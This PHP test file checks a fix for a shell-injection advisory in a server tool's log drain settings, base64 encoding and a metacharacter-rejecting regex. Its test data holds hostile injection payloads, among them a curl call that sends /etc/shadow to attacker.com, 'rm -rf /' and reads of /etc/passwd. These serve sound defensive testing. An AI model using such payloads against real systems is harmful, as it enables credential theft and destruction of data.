<?php

use App\Actions\Server\StartLogDrain;
use App\Models\Server;
use App\Models\ServerSetting;

// -------------------------------------------------------------------------
// GHSA-3xm2-hqg8-4m2p: Verify log drain env values are base64-encoded
// and never appear raw in shell commands
// -------------------------------------------------------------------------

it('does not interpolate axiom api key into shell commands', function () {
    $maliciousPayload = '$(id >/tmp/pwned)';

    $server = mock(Server::class)->makePartial();
    $settings = mock(ServerSetting::class)->makePartial();

    $settings->is_logdrain_axiom_enabled = true;
    $settings->is_logdrain_newrelic_enabled = false;
    $settings->is_logdrain_highlight_enabled = false;
    $settings->is_logdrain_custom_enabled = false;
    $settings->logdrain_axiom_dataset_name = 'test-dataset';
    $settings->logdrain_axiom_api_key = $maliciousPayload;

    $server->name = 'test-server';
    $server->shouldReceive('getAttribute')->with('settings')->andReturn($settings);

    // Build the env content the same way StartLogDrain does after the fix
    $envContent = "AXIOM_DATASET_NAME={$settings->logdrain_axiom_dataset_name}\nAXIOM_API_KEY={$settings->logdrain_axiom_api_key}\n";
    $envEncoded = base64_encode($envContent);

    // The malicious payload must NOT appear directly in the encoded string
    // (it's inside the base64 blob, which the shell treats as opaque data)
    expect($envEncoded)->not->toContain($maliciousPayload);

    // Verify the decoded content preserves the value exactly
    $decoded = base64_decode($envEncoded);
    expect($decoded)->toContain("AXIOM_API_KEY={$maliciousPayload}");
});

it('does not interpolate newrelic license key into shell commands', function () {
    $maliciousPayload = '`rm -rf /`';

    $envContent = "LICENSE_KEY={$maliciousPayload}\nBASE_URI=https://example.com\n";
    $envEncoded = base64_encode($envContent);

    expect($envEncoded)->not->toContain($maliciousPayload);

    $decoded = base64_decode($envEncoded);
    expect($decoded)->toContain("LICENSE_KEY={$maliciousPayload}");
});

it('does not interpolate highlight project id into shell commands', function () {
    $maliciousPayload = '$(curl attacker.com/steal?key=$(cat /etc/shadow))';

    $envContent = "HIGHLIGHT_PROJECT_ID={$maliciousPayload}\n";
    $envEncoded = base64_encode($envContent);

    expect($envEncoded)->not->toContain($maliciousPayload);
});

it('produces correct env file content for axiom type', function () {
    $datasetName = 'my-dataset';
    $apiKey = 'xaat-abc123-def456';

    $envContent = "AXIOM_DATASET_NAME={$datasetName}\nAXIOM_API_KEY={$apiKey}\n";
    $decoded = base64_decode(base64_encode($envContent));

    expect($decoded)->toBe("AXIOM_DATASET_NAME=my-dataset\nAXIOM_API_KEY=xaat-abc123-def456\n");
});

it('produces correct env file content for newrelic type', function () {
    $licenseKey = 'nr-license-123';
    $baseUri = 'https://log-api.newrelic.com/log/v1';

    $envContent = "LICENSE_KEY={$licenseKey}\nBASE_URI={$baseUri}\n";
    $decoded = base64_decode(base64_encode($envContent));

    expect($decoded)->toBe("LICENSE_KEY=nr-license-123\nBASE_URI=https://log-api.newrelic.com/log/v1\n");
});

// -------------------------------------------------------------------------
// Validation layer: reject shell metacharacters
// -------------------------------------------------------------------------

it('rejects shell metacharacters in log drain fields', function (string $payload) {
    // These payloads should NOT match the safe regex pattern
    $pattern = '/^[a-zA-Z0-9_\-\.]+$/';

    expect(preg_match($pattern, $payload))->toBe(0);
})->with([
    '$(id)',
    '`id`',
    'key;rm -rf /',
    'key|cat /etc/passwd',
    'key && whoami',
    'key$(curl evil.com)',
    "key\nnewline",
    'key with spaces',
    'key>file',
    'key<file',
    "key'quoted",
    'key"doublequoted',
    'key$(id >/tmp/coolify_poc_logdrain)',
]);

it('accepts valid log drain field values', function (string $value) {
    $pattern = '/^[a-zA-Z0-9_\-\.]+$/';

    expect(preg_match($pattern, $value))->toBe(1);
})->with([
    'xaat-abc123-def456',
    'my-dataset',
    'my_dataset',
    'simple123',
    'nr-license.key_v2',
    'project-id-123',
]);
